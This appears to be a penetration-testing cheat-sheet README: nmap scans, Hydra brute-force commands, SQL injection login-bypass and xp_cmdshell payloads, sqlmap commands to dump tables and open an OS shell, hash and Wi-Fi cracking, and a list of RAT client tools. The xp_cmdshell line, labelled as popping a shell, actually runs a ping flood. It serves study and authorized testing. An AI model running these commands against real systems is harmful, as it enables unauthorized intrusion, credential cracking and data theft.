# OffSec-Notes
Repository created for keeping notes on various topics, vulnerabilities and tools useful in penetration testing. 

# Reconnaissance

### Some Common Ports

 Port     | Service  | Protocol          |
| --------|:--------:| -----------------:|
| 21      | FTP      |    TCP, UDP, SCTP |
| 22      | SSH      |    TCP, UDP, SCTP |
| 137     | NetBIOS  |    TCP, UDP       |
| 161     | SNMP     |    UDP            |
| 445     | SMB      |    TCP, UDP       |
| 3389    | RDP      |    TCP            |

<details>
<summary>nmap</summary>

```sudo nmap -sn 192.168.0.0/24``` - Check for hosts only, disable port scan (-sn).

```nmap -sT [IP]``` - Use TCP connect scan (-sT) if not root/sudo user. Only option for non sudoers.

```sudo nmap [IP] ``` -  By default nmap uses TCP SYN scan (-sS), but this should be used only from root/sudo user.

```sudo nmap -sV -O -v [IP] -p- -oN [Filename.txt]``` - Default SYN scan with enabled version detection (-sV) and OS detection (-O). Additional flags - verbose mode (-v), all ports (-p-), output to .txt file (-oN). 

```sudo nmap -A [IP]``` - Default SYN scan with enabled OS detection, version detection, script scanning, and traceroute (-A).

```sudo nmap --script http-methods [IP]``` - Default SYN scan with specific script (--script). As an example script *http-methods* (enumerates allowed HTTP methods) is used.

```sudo nmap -sU [IP]``` - Performs UDP scan (-sU).

```-n``` - Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. Since DNS can be slow even with Nmap's built-in parallel stub resolver, this option reduces scanning times.

Useful nmap scripts:

 Script   | Service  | Description |
|:--------|:--------|:-----------|
| smb-os-discovery.nse    | SMB (445)  | Enumerate OS, domain name,etc. |
| smb-enum-users.nse      | SMB (445)  | Used to enumerate all users on remote Windows system using SAMR enumeration and LSA bruteforcing. |
| smb-enum-shares.nse     | SMB (445)  | SMB shares. |

</details>

# Brute-force
<details>
<summary>Hydra</summary>

```sudo hydra -l <username> -P <wordlist> [URL] ssh``` - Basic Hydra command for brute-forcing ssh password. Works similarly with other protocols such as FTP.

```sudo hydra -l <username> -P <wordlist> [base_URL] http-post-form "<path>:<login_credentials>:<invalid_response>"``` - Hydra command for HTTP POST form. Path need to be specified seperately from base URL.

</details>

# SQL Injection

For SQL injection focused task either perform the injection manually or use sqlmap tool. Check fields using single quote or encoded single quote.

```blah' or 1=1 --``` - Basic login bypass payload. Adjust for specific case.

```blah';exec master..xp_cmdshell 'ping [URL] -l 65000 -t'; --``` - Example command to pop shell through sql injection.

<details>
<summary>sqlmap</summary>

```sudo sqlmap -u “[URL]” --cookie="[cookie_value]" --dbs``` - Initial command to enumerate databases (--dbs). Add cookie values if necessary (--cookie).

```sudo sqlmap -u “[URL]” -D [database_name] --tables``` - Enumerate tables in the specified database (--tables).

```sudo sqlmap -u “[URL]” -D [database_name] -T [table_name] --columns``` - Enumerate columns in the specified table (--columns).

```sudo sqlmap -u “[URL]” -D [database_name] -T [table_name] --dump``` - Dump all data from table (--dump).

```sqlmap -u “[URL]” --os-shell``` - Pop shell through sqlmap (--os-shell).

```sudo sqlmap -r [filename] --batch -v 5 | tee [output]``` - Use sqlmap with request from file (-r), for example, captured by Burp. This command also uses standard behaviour (--batch) and saves the output to a file (| tee)


</details>

# Android hacking
<details>
<summary>ADB</summary>

```adb devices``` - Check for devices connected to the host.

```adb shell``` - Enter phone terminal.

```adb shell pm path [package_name]``` - Check path for given app package.

Package names can be viewed via Google Play store. For example: https://play.google.com/store/apps/details?id=com.swapcard.apps.android.blackhat&hl=en_IN

Package name in this case is "com.swapcard.apps.android.backhat"

![image](https://github.com/MaxLazerhawk/OffSec-Notes/assets/53828427/31e2fce7-9d1e-4b85-9ae3-49e13fc81c48)

</details>

# Cryptography
<details>
<summary>hashcat</summary>
Useful sites for online hashes:
  
- https://hashes.com
- https://hashes.com/en/tools/hash_identifier

Can also use hashid to identify hash type:

```hashid -m [hash]```
- m to show corresponding hashcat mode.

Standard hashcat command:

```hashcat -a 0 -m [hash_mode_id] [hash] [wordlist]``` 
- Straight attack mode suited for wordlist (-a 0).
- Specified hash type (-m).

If hashcat does not work consider using John the Ripper.

------

</details>

<details>
<summary>John the Ripper</summary>

```john --format=nt --wordlist=<path-to-wordlist> <hash>```
- Set hash format (--format=).
- Set wordlist (--wordlist=).

For hash formats check:
https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

------

</details>

</details>

<details>
<summary>Other Tools</summary>

**Hashmyfiles** - For calculating and comparing hashes of files. Can be used to compare hashes and find tempered data.

**CryptoForge** - For easy encrypting and decrypting using password.

**BcTextEncodes** - For encoding and decoding text in file (.hex). 

**Cryptool** - For encryption/decryption of hex data - by manipulating the key length. This tool can perform brute-force analysis.

**Veracrypt** - For hiding and encrypting disk partitions. Can also be used to open encrypted disk partition (mount). Outer and inner partitions has separate passwords.

</details>

# Malware Threats

<details>
<summary>RAT's</summary>

You need to target the right IP and port number (try default first).
You need to use the right tool from the available.

Example tools to establish a connection to a RAT:
- njRAT
- MoSucker
- ProRat
- Theef
- HTTP RAT

</details>

<details>
<summary>Malware Analysis Tools</summary>

**DIE (Detect it Easy)** - Scan and analyze .elf files.

</details>

# Steganography
<details>
<summary>Tools</summary>

**SNOW** - [placeholder]. 

**Steghide** - [placeholder].

```steghide extract -sf [file]``` - Extract confidential file from, for example, picture .jpg file.

```stegcracker <file> [wordlist]``` - Crack password protected file.

</details>

# Wireless Attacks
<details>
<summary>aircrack-ng</summary>
Used to crack .cap files. WEP, WPA/WPA2 wireless networks.

```aircrack-ng [filename].cap```

- Works for WEP.
- If the capture file has sufficient packets aircrack will be able to crack it.

```aircrack-ng [filename].cap -w [file]``` 

- Works for WPA.
- Dictionary added (-w).

</details>
